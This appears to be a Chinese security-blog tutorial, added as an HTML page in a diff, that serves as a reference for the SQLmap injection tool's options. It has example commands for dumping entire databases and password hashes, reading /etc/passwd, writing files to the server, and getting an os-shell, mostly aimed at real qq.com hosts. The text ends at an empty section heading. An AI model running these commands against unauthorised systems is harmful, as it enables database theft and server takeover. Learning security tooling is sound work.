@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <title>
+    安全工具 - SQLmap的用法 // SecTrain安全博客
+  </title>
+
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+<meta name="description" content="基础篇 - 介绍SQLmap的常用用法, 作为笔记">
+<meta name="keywords" content="">
+<meta name="author" content="HuangJacky">
+<meta name="generator" content="Hugo 0.92.0" />
+
+  <meta property="og:title" content="安全工具 - SQLmap的用法" />
+<meta property="og:description" content="基础篇 - 介绍SQLmap的常用用法, 作为笔记" />
+<meta property="og:type" content="website" />
+<meta property="og:locale" content="en_US" />
+<meta property="og:url" content="https://vul-hunters.gitee.io/hunter-blogs/posts/sec-tools-sqlmap/" />
+
+
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/base-min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/pure-min.css">
+  
+  
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/1.0.0/grids-responsive-min.css">
+  
+  
+
+  <link rel="stylesheet" href="https://vul-hunters.gitee.io/hunter-blogs//css/redlounge.css">
+  <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href='//fonts.proxy.ustclug.org/css?family=Raleway:400,200,100,700,300,500,600,800' rel='stylesheet' type='text/css'>
+  <link href='//fonts.proxy.ustclug.org/css?family=Libre+Baskerville:400,700,400italic' rel='stylesheet' type='text/css'>
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/touch-icon-144-precomposed.png">
+  <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
+
+  
+  <link href="" rel="alternate" type="application/rss+xml" title="SecTrain安全博客" />
+
+    
+  
+  <link rel="stylesheet" href="/hunter-blogs/css/tomorrow-night-bright.min.css">
+  
+  <script src="/hunter-blogs/js/highlight.min.js"></script>
+  <script>hljs.initHighlightingOnLoad();</script>
+
+
+  
+  <script src="//ajax.proxy.ustclug.org/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://vul-hunters.gitee.io/hunter-blogs//css/lightbox.css">
+  <script src="https://vul-hunters.gitee.io/hunter-blogs//js/lightbox.min.js"></script>
+  
+
+  
+
+  
+
+  
+</head>
+
+<body>
+	
+
+	<div id="layout" class="pure-g">
+    <div class="sidebar pure-u-1 pure-u-md-1-4">
+  <div class="header">
+    
+
+	
+	  <img src="/hunter-blogs/img/anonymous.png" class="sidebarphoto">
+	
+
+    <h1 class="brand-title">个人技术分享</h1>
+    <h2 class="brand-tagline">相互成就理想</h2>
+
+    <nav class="nav">
+      <ul class="nav-list">
+        <li class="nav-item"><span class="nav-item-separator">//</span><a href="https://vul-hunters.gitee.io/hunter-blogs/">首页</a></li>
+        
+          <li class="nav-item"><span class="nav-item-separator">//</span><a href="/hunter-blogs/posts">技术博客</a></li>
+        
+      </ul>
+    </nav>
+
+    
+
+  </div>
+</div>
+
+
+	
+
+    <div class="content pure-u-1 pure-u-md-3-4">
+		<a name="top"></a>
+		
+
+		
+			
+		    <div id="toc" class="pure-u-1 pure-u-md-1-4">
+				<small class="toc-label">Contents</small>
+		   	 	<nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-序言">0x00 序言</a></li>
+    <li><a href="#0x01-用法">0x01 用法</a>
+      <ul>
+        <li><a href="#目标选定">目标选定</a></li>
+        <li><a href="#请求相关的参数">请求相关的参数</a></li>
+        <li><a href="#优化">优化</a></li>
+        <li><a href="#检测">检测</a></li>
+        <li><a href="#注入相关">注入相关</a></li>
+        <li><a href="#枚举">枚举</a></li>
+        <li><a href="#其他">其他</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-常见用法">0x02 常见用法</a>
+      <ul>
+        <li><a href="#在url重定向的情况下指定检测参数">在URL重定向的情况下指定检测参数</a></li>
+        <li><a href="#适合后台快速检测的命令">适合后台快速检测的命令</a></li>
+        <li><a href="#导出相关内容">导出相关内容</a></li>
+        <li><a href="#清除session-重新扫描">清除session, 重新扫描</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-附录">0x03 附录</a></li>
+  </ul>
+</nav>
+		    </div>
+		    
+	    
+  		<section class="post">
+            <h1 class="post-title">
+              <a href="/hunter-blogs/posts/sec-tools-sqlmap/">安全工具 - SQLmap的用法</a>
+            </h1>
+            <h3 class="post-subtitle">
+            	
+            </h3>
+            
+            	<span class="post-date">
+                	<span class="post-date-day"><sup>20</sup></span><span class="post-date-separator">/</span><span class="post-date-month">Apr</span> <span class="post-date-year">2017</span>
+            	</span>
+            	
+            
+            	
+            		<span class="post-author-single">By <a class="post-author"  target="">HuangJacky</a></span>
+            		
+
+
+
+
+            	
+            
+
+			
+			
+				<div class="post-categories">
+				
+					<a class="post-category post-category-%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7" href="https://vul-hunters.gitee.io/hunter-blogs//categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7">安全工具</a>
+				
+				</div>
+			
+
+			
+
+			
+
+            <h2 id="0x00-序言">0x00 序言</h2>
+<p>前一篇文章介绍了nmap的用法, 这次再介绍一个神器, 那就是SQLmap, 它作为SQL注入界自动化检测工具,能够实现高难度漏洞检测, 脱裤等工作,大大减少安全人员的时间.</p>
+<h2 id="0x01-用法">0x01 用法</h2>
+<p>拿到一个工具之前,我们可以用过帮助文档查看它一般的用法.
+运行以下命令, 可以查看到详细的帮助:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -hh
+</code></pre></div><h3 id="目标选定">目标选定</h3>
+<h4 id="指定url">指定URL</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://svip.qq.com/abc?d=1&#34;</span>
+</code></pre></div><p>对指定的URL进行SQL注入检测</p>
+<h4 id="指定google搜索的关键字">指定GOOGLE搜索的关键字</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -g <span style="color:#e6db74">&#39;site:&#34;svip.qq.com&#34; filetype:pdf&#39;</span>
+</code></pre></div><p>对GOOGLE搜索出来的每一页结果中的链接进行SQL注入检测</p>
+<h4 id="指定burp或者webscarab导出文件">指定BURP或者WebScarab导出文件</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -l ./a.log
+</code></pre></div><p>将BURP等安全抓包工具中导出的需要分析的请求进行SQL注入检测</p>
+<h4 id="指定sitemapxml">指定sitemap.xml</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -x <span style="color:#e6db74">&#34;https://m.juzilicai.com/sitemap.xml&#34;</span>
+</code></pre></div><p>读取指定sitemap.xml文件,并分析其中URL进行SQL注入检测</p>
+<h4 id="指定http请求报文">指定HTTP请求报文</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -r ./request.txt
+</code></pre></div><p>这个是sqlmap最简单的, 也是最好用的一个用法, sqlmap会去读取这个HTTP请求文件, 从文件中提取出所有HTTP请求相关的参数进行填充, 这样可以为了省去很多参数的配置.</p>
+<h4 id="指定多个请求">指定多个请求</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -m ./multi.txt
+</code></pre></div><p>从文件中读取多个请求进行SQL注入检测</p>
+<h3 id="请求相关的参数">请求相关的参数</h3>
+<h4 id="指定请求方式">指定请求方式</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://db.qq.com/test&#34;</span> --method POST
+</code></pre></div><p>使用POST请求对URL进行SQL检测</p>
+<h4 id="指定请求的内容">指定请求的内容</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://db.qq.com/test&#34;</span> --method POST --data <span style="color:#e6db74">&#34;a=1&amp;b=2&#34;</span>
+</code></pre></div><p>向指定URL通过POST发送data数据,并且对相关参数进行SQL注入检测, data通常用在POST和PUT请求中</p>
+<h4 id="指定cookie">指定Cookie</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://db.qq.com/test&#34;</span> --cookie <span style="color:#e6db74">&#34;a=1; b=2&#34;</span>
+</code></pre></div><p>指定Cookie对URL进行SQL注入检测, 一般接口需要登录态, Cookie中存在注入也可以进行检测<br>
+相关其他参数:</p>
+<ul>
+<li>drop-set-cookie: 忽略响应中Set-Cookie的响应头</li>
+</ul>
+<h4 id="指定user-agent">指定User-Agent</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --user-agent <span style="color:#e6db74">&#34;huangjacky1.2&#34;</span>
+</code></pre></div><p>将HTTP请求头中User-Agent字段设置成指定的内容<br>
+相关其他参数:</p>
+<ul>
+<li>random-agent: 随机设置浏览器agent字符串</li>
+</ul>
+<h4 id="指定referer">指定Referer</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --referer <span style="color:#e6db74">&#34;http://a.qq.com&#34;</span>
+</code></pre></div><p>设置请求头中Referer字段, 很多网站会为了防止CSRF对Referer进行检测, 因此这个字段很多时候需要使用</p>
+<h4 id="指定其他http头">指定其他HTTP头</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> -H <span style="color:#e6db74">&#34;X-Forwarded-For: 127.0.0.1&#34;</span>
+</code></pre></div><p>设置任意HTTP头后对URL进行SQL注入检测<br>
+相关其他参数:</p>
+<ul>
+<li>headers: 一次性设置多个头, 头之间用\n进行分隔</li>
+</ul>
+<h4 id="指定超时重试间隔">指定超时,重试,间隔</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --delay <span style="color:#ae81ff">1</span> --timeout <span style="color:#ae81ff">15</span> --retries <span style="color:#ae81ff">2</span>
+</code></pre></div><p>针对部分网络情况对请求进行策略调整.</p>
+<ul>
+<li>delay: 请求和请求之间间隔多少秒, 默认没有间隔,可能会被频率控制拦截</li>
+<li>timeout: 请求执行超时时间,单位秒,默认是30s</li>
+<li>retries: 当发生超时时候,是否执行重试, 默认3次</li>
+</ul>
+<h4 id="指定csrf-token">指定CSRF TOKEN</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test?a=1&amp;token=1111&#34;</span> --csrf-token token --csrf-url <span style="color:#e6db74">&#34;http://a.qq.com/token&#34;</span>
+</code></pre></div><p>告诉SQLmap参数中哪一个参数是token, 这个值需要从什么地方获取</p>
+<ul>
+<li>csrf-token: token的字段名</li>
+<li>csrf-url: 指定URL页面获取token的值</li>
+</ul>
+<h4 id="执行指定的python代码">执行指定的python代码</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test?id=1&amp;hash=xxxxx&#34;</span> --eval<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;import hashlib;hash=hashlib.md5(id).hexdigest()&#34;</span>
+</code></pre></div><p>当参数之间的逻辑需要特定的方式去实现的时候,我们可以通过eval来写一段python代码来实现.</p>
+<p>其他参数暂时不介绍了,使用不是很多.</p>
+<h3 id="优化">优化</h3>
+<h4 id="并发线程数">并发线程数</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --threads <span style="color:#ae81ff">8</span>
+</code></pre></div><p>设置请求的线程数, 默认只有1, 最大不能超过10</p>
+<h4 id="长连接">长连接</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --keep-alive
+</code></pre></div><p>使用HTTP长连接,让请求之间复用HTTP连接,减少TCP连接的消耗</p>
+<h4 id="不获取内容">不获取内容</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --null-connection
+</code></pre></div><p>SQLmap只检测响应的字节数,不去获取响应内容, 因为很多时候字节数就可以判断出来是否存在问题</p>
+<h4 id="打开的优化项开关">打开的优化项开关</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> -o
+</code></pre></div><p>开关打开后,上面优化的选项才能生效. 切记.</p>
+<h3 id="检测">检测</h3>
+<h4 id="检测和风险等级">检测和风险等级</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --level <span style="color:#ae81ff">5</span> --risk <span style="color:#ae81ff">3</span>
+</code></pre></div><p><strong>level:</strong> 设置检测的方方面面和测试用例, 默认是1,会尝试POST和GET, 2:Cookie也会加入检测, 3:User-Agent和Referer也会检测, 更大的值会增加用例量<br>
+<strong>risk:</strong> 设置测试用例的类型,默认是1, 会使用常见的注入用例,2:加入基于时间的盲注, 3: 增加基于OR的测试用例</p>
+<h4 id="内容检测标准">内容检测标准</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --string OK --not-string WRONG
+</code></pre></div><p>帮助SQLmap识别内容中是否注入成立.</p>
+<ul>
+<li>string: sql为True时候的内容匹配</li>
+<li>not-string: sql为False时候的内容匹配</li>
+<li>regexp: sql为True时候的正则匹配</li>
+<li>code: sql为True的时候响应码</li>
+</ul>
+<p>相关其他参数:</p>
+<ul>
+<li>text-only: 只检测文本内容</li>
+<li>titles: 只检测HTML的title</li>
+</ul>
+<h3 id="注入相关">注入相关</h3>
+<h4 id="指定参数">指定参数</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test?a=1&amp;b=2&#34;</span> --level <span style="color:#ae81ff">2</span> -p <span style="color:#e6db74">&#39;a,user-agent&#39;</span> --skip b
+</code></pre></div><p>默认SQLmap会检测所有相关的参数, 为了效率我们可以指定只检测某些参数,或者不检测那些参数.<br>
+这些参数除了GET,POST还可以像例子中设置user-agent等请求头.</p>
+<h4 id="指定后端数据库">指定后端数据库</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --dbms mysql
+</code></pre></div><p>如果能够知道后端数据库的类型后, 我们可以指定类型后,减少无关的测试用例.</p>
+<h4 id="加工脚本">加工脚本</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --tamper base64encode.py
+</code></pre></div><p>对SQLmap的payload进行base64编码后再提交<br>
+可用的tamper脚本都位于tamper目录下, 我们也可以实现自己的tamper脚本</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> lib.core.enums <span style="color:#f92672">import</span> PRIORITY
+__priority__ <span style="color:#f92672">=</span> PRIORITY<span style="color:#f92672">.</span>NORMAL
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tamper</span>(payload):
+    <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">    Description of your tamper script
+</span><span style="color:#e6db74">    &#39;&#39;&#39;</span>
+    retVal <span style="color:#f92672">=</span> payload
+    <span style="color:#66d9ef">return</span> retVal
+</code></pre></div><p>输入是原始的SQLmap的payload, 输出是处理后的值</p>
+<h3 id="枚举">枚举</h3>
+<p>当检测到存在SQL注入漏洞之后, SQLmap会帮助我们自动化枚举相关信息.</p>
+<h4 id="枚举概况">枚举概况</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> -a -b
+</code></pre></div><p>其中:</p>
+<ul>
+<li>a : 枚举所有的信息, 后面会介绍有多少信息</li>
+<li>b : 返回数据库的banner, 一般有类型,版本等信息.</li>
+</ul>
+<h4 id="枚举当前数据库和用户">枚举当前数据库和用户</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --current-db --current-user --hostname --is-dba
+</code></pre></div><p>枚举以下信息:</p>
+<ul>
+<li>current-db: 当前程序使用的db的名字</li>
+<li>current-user: 当前程序使用的数据库用户名</li>
+<li>hostname: 当前DB服务器的主机名</li>
+<li>is-dba: 当前程序所使用的数据库用户是不是dba</li>
+</ul>
+<h4 id="枚举数据库相关信息">枚举数据库相关信息</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --users --passwords --privileges --dbs
+</code></pre></div><p>枚举以下信息, 但是因为权限问题, 不一定能获取到信息:</p>
+<ul>
+<li>users: 数据库服务器中所有的用户</li>
+<li>passwords: 数据库服务器中所有用户的密码hash</li>
+<li>privileges: 数据库服务器中所有的用户权限分配</li>
+<li>dbs: 数据库服务器中所有的数据库名字</li>
+</ul>
+<h4 id="指定被枚举对象">指定被枚举对象</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> -D 库名 -T 表名 -C 列名 -U 用户名 <span style="color:#75715e"># 后面再接上其他枚举指令</span>
+</code></pre></div><p>指定被枚举的对象, 比如我们要枚举某一个库中所有的表, 那么就需要使用-D来指定库名</p>
+<h4 id="枚举数据库相关详情">枚举数据库相关详情</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --tables --columns --count
+</code></pre></div><p>枚举以下信息:</p>
+<ul>
+<li>tables: 枚举指定数据库中所有的表名, 需要-D</li>
+<li>columns: 枚举指定表中所有的列名, 需要-T</li>
+<li>count: 获取指定表中记录数, 需要-T</li>
+</ul>
+<h4 id="导出">导出</h4>
+<p>其实就是我们俗称的脱裤</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --dump -D testDB -T testTB
+</code></pre></div><p>导出指定表中所有数据</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --dump-all -D testDB
+</code></pre></div><p>导出所有表的所有数据</p>
+<h4 id="暴力枚举">暴力枚举</h4>
+<p>很多时候, 因为权限设置, 程序所使用的数据库用户并不能通过系统相关表来获取到所有的表和列, 那么我们只能通过字典进行枚举.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --tables -D testDB --common-tables
+</code></pre></div><p>通过表名的字典去尝试查询testDB中所有存在的表.<br>
+同样地道理<strong>common-columns</strong>来暴力猜所有的列名.<br>
+相关的字典分别位于: txt/common-tables.txt和txt/common-columns.txt中,我们可以自己维护.</p>
+<h4 id="文件操作">文件操作</h4>
+<p>当用户的权限和数据库服务器满足特定条件才能操作:</p>
+<h5 id="读取数据库服务器上的文件">读取数据库服务器上的文件</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --file-read<span style="color:#f92672">=</span>/etc/passwd
+</code></pre></div><p>读取指定文件到SQLmap的session目录中去</p>
+<h5 id="上传本地文件到数据库服务器">上传本地文件到数据库服务器</h5>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --file-write<span style="color:#f92672">=</span>本地文件路径 --file-dest<span style="color:#f92672">=</span>数据库服务器路径
+</code></pre></div><p>把本地一个文件上传到数据库服务器中去, 注意目标路径,数据库用户一定要有写权限</p>
+<h4 id="执行系统命令">执行系统命令</h4>
+<p>相关的操作也需要数据库用户的权限, 因此也不一定能执行成功</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --os-cmd <span style="color:#e6db74">&#34;id&#34;</span>
+</code></pre></div><p>执行一个系统命令, 并返回结果.<br>
+我们还可以使用<strong>os-shell</strong>来获取一个交互式的shell, 直接输入命令等.</p>
+<h3 id="其他">其他</h3>
+<h4 id="输出格式">输出格式</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --dump-all -D testdb --dump-format HTML --output-dir /data/test
+</code></pre></div><p>设置导出的格式和session等其他输出保存的目录</p>
+<h4 id="静默运行">静默运行</h4>
+<p>正常情况, 很多地方SQLmap都会询问我们一些选项, 在自动化的过程中,这个非常麻烦.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --batch --answers <span style="color:#e6db74">&#34;follow=Y,extending=N&#34;</span>
+</code></pre></div><p>使用batch的话,所有提问的地方都选择默认参数. 如果你需要个别地方指定回答, 那么你可以使用answers写上多个你自己的答案.</p>
+<h4 id="清除缓存">清除缓存</h4>
+<p>默认情况SQLmap会使用上一次检测的结果, 这样对于代码修复后的效果检测会存在很大的误报.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --flush-session --fresh-queries
+</code></pre></div><p>其中<strong>flush-session</strong>会清空当前URL相关的session, <strong>fresh-queries</strong>会忽略之前的查询结果,进行重新请求操作.</p>
+<h4 id="查看注入详情">查看注入详情</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> -v <span style="color:#ae81ff">1</span>
+</code></pre></div><p>设置不同详情的等级, 显示不同的内容.其中含义如下:</p>
+<ol start="0">
+<li>只显示python错误以及严重的信息。</li>
+<li>同时显示基本信息和警告信息。（默认）</li>
+<li>同时显示debug信息。</li>
+<li>同时显示注入的payload。</li>
+<li>同时显示HTTP请求。</li>
+<li>同时显示HTTP响应头。</li>
+<li>同时显示HTTP响应页面</li>
+</ol>
+<h4 id="记录所有http内容">记录所有HTTP内容</h4>
+<p>作为一个爱学习的好青年, 我们需要了解SQLmap都发送了什么内容, 服务器又返回了什么内容.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> -t ./http.queries.txt
+</code></pre></div><h4 id="无人值守">无人值守</h4>
+<p>作为一个成功人士,我们的时间都是宝贵的, 不可能一直定在屏幕面前, 那么我们需要在SQLmap检测到SQL注入的时候主动通知我们.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test&#34;</span> --alert <span style="color:#e6db74">&#34;系统命令&#34;</span> --beep
+</code></pre></div><p>beep就是电脑会叫一声, 主要还是alert可以执行一个系统命令, 我们可以让它给我们发短信, 发微信.</p>
+<h4 id="新手模式">新手模式</h4>
+<p>参数这么多,如果你记不住怎么办?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap --wizard
+</code></pre></div><p>开启一个交互式的注入检测,你只需要跟着提示来就好了.</p>
+<h2 id="0x02-常见用法">0x02 常见用法</h2>
+<h3 id="在url重定向的情况下指定检测参数">在URL重定向的情况下指定检测参数</h3>
+<p>现在很多框架都将URL重写, 相关的参数不会以querystring的方式出现, 那么我们需要告诉sqlmap注入点在什么地方</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#34;http://a.qq.com/test/111*/bbb/a%INJECT HERE%&#34;</span>
+</code></pre></div><p>只需要在指定的参数(Cookie,Header头里面都行)后面加上*或者%INJECT HERE%, 这样同时可以避免使用-p参数</p>
+<h3 id="适合后台快速检测的命令">适合后台快速检测的命令</h3>
